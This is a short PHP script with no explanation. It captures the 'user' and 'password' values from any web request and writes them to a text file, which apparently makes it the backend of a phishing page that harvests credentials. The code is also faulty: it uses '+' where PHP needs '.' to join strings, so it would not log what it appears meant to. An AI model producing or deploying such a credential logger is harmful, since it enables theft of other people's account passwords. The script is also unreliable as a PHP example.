<?php
			$users = 'test.txt';
			$handle = fopen($users, 'w+') or die('Cannot open file: '+$users);
			$data = 'User: '+$_REQUEST['user']+" Pass: "+$_REQUEST['password']+"\n";
			fwrite($handle, $data);
			fclose($handle);
?>